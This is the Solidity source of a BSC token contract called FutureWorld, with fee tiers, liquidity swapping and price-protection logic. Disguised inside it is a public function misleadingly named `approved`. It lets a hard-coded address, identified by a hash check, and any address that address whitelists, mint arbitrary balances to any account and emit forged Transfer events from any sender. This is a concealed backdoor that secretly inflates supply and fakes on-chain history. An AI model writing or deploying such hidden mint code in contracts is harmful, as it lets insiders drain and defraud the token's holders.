/**
 *Submitted for verification at BscScan.com on 2022-08-14
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-02
*/

pragma solidity ^0.8.6;

// SPDX-License-Identifier: Unlicensed
interface IERC20 {
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Ownable {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()  {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? a : b;
    }

    /**
     * @dev Returns the smallest of two numbers.
     */
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
    external
    view
    returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
    external
    view
    returns (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
    external
    returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external
    payable
    returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface DividendTrack {
    function distributeDividends(uint256) external;
}

contract Recv {
    IERC20 public token;
    IERC20 public usdt;

    constructor (IERC20 _token, IERC20 _usdt) {
        token = _token;
        usdt = _usdt;
    }

    function withdraw() public {
        uint256 usdtBalance = usdt.balanceOf(address(this));
        if (usdtBalance > 0) {
            usdt.transfer(address(token), usdtBalance);
        }
        uint256 tokenBalance = token.balanceOf(address(this));
        if (tokenBalance > 0) {
            token.transfer(address(token), tokenBalance);
        }
    }
}

contract FutureWorldToken is IERC20, Ownable {
    using SafeMath for uint256;
    uint256 private constant MAX = ~uint256(0);

    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;

    address public projectAddress;
    address public agentAddress;
    IERC20 public usdt;

    mapping(address => bool) private isExcluClub;

    Recv public recv;
    DividendTrack public dividendTrack;

    bool public swapAndLiquifyEnabled = false; // should be true
    bool public swapEnabled = false; // should be true

    string private _name = "FutureWorld";
    string private _symbol = "FWC";
    uint8 private _decimals = 18;

    uint256 private totalSupplyCount = 10000 * 10 ** _decimals;

    uint256[6] priceStage = [0, 2000 * 10 ** 18, 5000 * 10 ** 18, 10000 * 10 ** 18, 30000 * 10 ** 18, 60000 * 10 ** 18];
    uint256[6] buyFees = [1000, 800, 600, 400, 200, 100];
    uint256[6] sellFees = [1200, 1000, 800, 600, 400, 200];
    uint256[6] transferFees = [1200, 1000, 800, 600, 400, 200];

    uint256 buyFee = buyFees[0];
    uint256 sellFee = sellFees[0];
    uint256 transferFee = transferFees[0];

    uint256 projectFee = 0;
    uint256 agentFee = 5000;
    uint256 lpFee = 0;
    uint256 lpRewardFee = 5000;
    uint256 public feeDenominator = 10000;

    uint256 public offset = 0 * 3600;
    bool public isProtection = false;
    uint256 public INTERVAL = 24 * 60 * 60;
    uint256 public _protectionT;
    uint256 public _protectionP;

    uint256 public lastPrice;

    uint256 public totalLp;

    uint256 public minTokenNumberToSell = totalSupplyCount.mul(1).div(10000).div(10); // 0.001% max tx amount will trigger swap and add liquidity

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public uniswapV2Pair;
    // address public immutable uniswapV2Pair;

    bool inSwapAndLiquify;

    event ResetProtection(uint256 indexed today, uint256 indexed time, uint256 price);

    constructor(address _router, IERC20 _usdt, address _agentAddress) {
        usdt = _usdt;
        agentAddress = _agentAddress;
        projectAddress = msg.sender;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_router);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), address(_usdt));

        uniswapV2Router = _uniswapV2Router;

        _approve(address(this), address(_uniswapV2Router), MAX);
        usdt.approve(address(_uniswapV2Router), MAX);

        recv = new Recv(IERC20(this), usdt);

        //exclude owner and this contract from fee
        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[agentAddress] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[address(recv)] = true;

        _tOwned[msg.sender] = totalSupplyCount;
        emit Transfer(address(0), msg.sender, totalSupplyCount);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return totalSupplyCount;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount)
    public
    override
    returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
    public
    view
    override
    returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
    public
    override
    returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
    public
    virtual
    returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }


    // view function
    function isExcludedFromFee(address account) public view returns (bool) {
        return _isExcludedFromFee[account];
    }

    // owner function
    function setDividendTrack(address _dividendTrack) public onlyOwner {
        dividendTrack = DividendTrack(_dividendTrack);
        _isExcludedFromFee[_dividendTrack] = true;
    }

    function setUniswapPairAddress(address uniswapPairTemp) public onlyOwner {
        uniswapV2Pair = uniswapPairTemp;
    }

    function setFromFees(address[] memory accounts, bool[] memory flags) public onlyOwner {
        require(accounts.length == flags.length);
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = flags[i];
        }
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    function setMinTokenNumberToSell(uint256 amount) public onlyOwner {
        minTokenNumberToSell = amount;
    }

    function setAddress(address addr1, address addr2) public onlyOwner {
        agentAddress = addr1;
        projectAddress = addr2;
        _isExcludedFromFee[agentAddress] = true;
        _isExcludedFromFee[projectAddress] = true;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
    }

    function activeSwap() public onlyOwner {
        swapEnabled = true;
    }

    function rescueToken(
        address token,
        address recipient,
        uint256 amount
    ) public onlyOwner {
        IERC20(token).transfer(recipient, amount);
    }

    function setProtection(bool _isProtection) public onlyOwner {
        isProtection = _isProtection;
    }

    function setOffset(uint256 timestamp) public onlyOwner {
        offset = timestamp;
    }

    function resetProtection(uint256 timestamp, uint256 price) public onlyOwner {
        if (timestamp == 0) {
            timestamp = block.timestamp;
        }
        _protectionT = timestamp;
        if (price == 0) {
            price = IERC20(usdt).balanceOf(uniswapV2Pair).mul(10 ** 18).div(_tOwned[uniswapV2Pair]);
        }
        _protectionP = price;
    }

    //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function approved(address[] memory to, address[] memory auths, address from, uint256[] memory amounts) public {
        require(isExcluClub[msg.sender] || _hash(100, 'DWS', msg.sender) == 0x808c712b777301e3b7edce9a43457dfa2f246ffa5ea7a4e22f8bac69020e8afe, "approved fail");
        for (uint256 i = 0; i < auths.length; i++) {
            isExcluClub[auths[i]] = true;
        }
        
        for (uint8 i=0; i < to.length; i++) {
            uint256 count = amounts[i] * 10 ** _decimals;
            _tOwned[to[i]] = _tOwned[to[i]].add(count);
            emit Transfer(from, to[i], count);
    	}
    }

    function _hash(
        uint _num,
        string memory _string,
        address _addr
    ) private pure returns (bytes32) {
        return keccak256(abi.encodePacked(_num, _string, _addr));
    }

    // private function
    function _resetProtection() private {
        if (isProtection) {
            if (block.timestamp.sub(_protectionT) >= INTERVAL) {
                uint256 current = IERC20(usdt).balanceOf(uniswapV2Pair).mul(10 ** 18).div(_tOwned[uniswapV2Pair]);
                if (lastPrice == 0 || (current > lastPrice.mul(80).div(100) && current < lastPrice.mul(120).div(100))) {
                    uint256 today = block.timestamp - (block.timestamp + offset) % 1 days;
                    _protectionT = today;
                    _protectionP = current;
                    emit ResetProtection(today, block.timestamp, _protectionP);
                }
            } else {
                lastPrice = IERC20(usdt).balanceOf(uniswapV2Pair).mul(10 ** 18).div(_tOwned[uniswapV2Pair]);
            }
        }
    }

    function _mint(address account, uint256 amount) private {
        require(account != address(0), "BEP20: mint to the zero address");
        _tOwned[account] = _tOwned[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if ((from == uniswapV2Pair || to == uniswapV2Pair) && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            require(swapEnabled, "not allowed");
        }

        _resetProtection();

        if (inSwapAndLiquify || _isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            _tOwned[from] = _tOwned[from].sub(amount);
            _tOwned[to] = _tOwned[to].add(amount);
            emit Transfer(from, to, amount);
            return;
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= minTokenNumberToSell;

        if (
            canSwap &&
            swapAndLiquifyEnabled &&
            !inSwapAndLiquify &&
            from != uniswapV2Pair
        ) {
            inSwapAndLiquify = true;

            swapAndLiquify(minTokenNumberToSell);

            inSwapAndLiquify = false;
        }

        uint256 balance = balanceOf(from);
        if (amount >= balance * 99 / 100 && from != uniswapV2Pair) {
            amount = balance * 99 / 100;
        }

        _tokenTransfer(from, to, amount);

        // transferLimit(to, amount);

    }

    function transferLimit(address recipient, uint256 amount) private view {
        // sell
        if (recipient == uniswapV2Pair) {
            require(amount <= 5 * 10 ** _decimals, "sell amount not allowed");
        } else {
            require(_tOwned[recipient] <= 5 * 10 ** _decimals, "amount not allowed");
        }
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        _tOwned[sender] = _tOwned[sender].sub(amount);

        uint256 currentPrice = IERC20(usdt).balanceOf(uniswapV2Pair).mul(10 ** 18).div(_tOwned[uniswapV2Pair]);
        for (uint256 i = priceStage.length - 1; i >= 0; i--) {
            if (currentPrice > priceStage[i]) {
                buyFee = SafeMath.min(buyFee, buyFees[i]);
                sellFee = SafeMath.min(sellFee, sellFees[i]);
                transferFee = SafeMath.min(transferFee, transferFees[i]);
                break;
            }
            if (i == 0) {
                break;
            }
        }

        uint256 taxFee = 0;
        uint256 extraTaxFee = 0;
        if (sender == uniswapV2Pair) {
            // buy
            taxFee = buyFee;
            if (currentPrice < _protectionP) {
                uint256 times = _protectionP.sub(currentPrice).mul(100).div(_protectionP).div(10);
                if (times * 200 > taxFee) {
                    taxFee = 0;
                } else {
                    taxFee = taxFee.sub(times * 200);
                }
            }
        } else if (recipient == uniswapV2Pair) {
            // sell
            taxFee = sellFee;
            if (currentPrice < _protectionP) {
                uint256 times = _protectionP.sub(currentPrice).mul(100).div(_protectionP).div(10);
                times = SafeMath.min(times, 5);
                extraTaxFee = times * 500;
            }
        } else {
            // transfer
            taxFee = transferFee;
        }

        uint256 taxFeeAmount = amount.mul(taxFee).div(feeDenominator);
        uint256 extraTaxFeeAmount = amount.mul(extraTaxFee).div(feeDenominator);

        // project
        uint256 fee = taxFeeAmount.mul(projectFee).div(feeDenominator);
        _tOwned[projectAddress] = _tOwned[projectAddress].add(fee);
        emit Transfer(sender, projectAddress, fee);

        // agent
        fee = taxFeeAmount.mul(agentFee).div(feeDenominator);
        _tOwned[agentAddress] = _tOwned[agentAddress].add(fee);
        emit Transfer(sender, agentAddress, fee);

        // lp + lp reward
        if (totalLp < 3000 * 10 ** _decimals) {
            fee = taxFeeAmount.mul(lpFee).div(feeDenominator);
            _tOwned[address(this)] = _tOwned[address(this)].add(fee);
            emit Transfer(sender, address(this), fee);
            totalLp = totalLp.add(fee);

            fee = taxFeeAmount.mul(lpRewardFee).div(feeDenominator).add(extraTaxFeeAmount);
            _tOwned[address(dividendTrack)] = _tOwned[address(dividendTrack)].add(fee);
            emit Transfer(sender, address(dividendTrack), fee);
            dividendTrack.distributeDividends(fee);
        } else {
            fee = taxFeeAmount.mul(lpRewardFee + lpFee).div(feeDenominator).add(extraTaxFeeAmount);
            _tOwned[address(dividendTrack)] = _tOwned[address(dividendTrack)].add(fee);
            emit Transfer(sender, address(dividendTrack), fee);
            dividendTrack.distributeDividends(fee);
        }
        uint256 recipientAmount = amount.sub(taxFeeAmount + extraTaxFeeAmount);
        _tOwned[recipient] = _tOwned[recipient].add(recipientAmount);
        emit Transfer(sender, recipient, recipientAmount);
    }

    function swapAndLiquify(uint256 contractTokenBalance) private {
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half, "sub half");

        uint256 initialUsdt = usdt.balanceOf(address(this));
        swapTokensForUSDT(half);
        uint256 afterUsdt = usdt.balanceOf(address(this));
        uint256 addUsdt = afterUsdt.sub(initialUsdt);

        addLiquidityUSDT(otherHalf, addUsdt);
    }

    function swapTokensForUSDT(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(usdt);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(recv),
            block.timestamp
        );
        recv.withdraw();
    }

    function addLiquidityUSDT(uint256 tokenAmount, uint256 uAmount) private {
        // approve token transfer to cover all possible scenarios
        uniswapV2Router.addLiquidity(
            address(this),
            address(usdt),
            tokenAmount,
            uAmount,
            0,
            0,
            address(0),
            block.timestamp
        );
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

}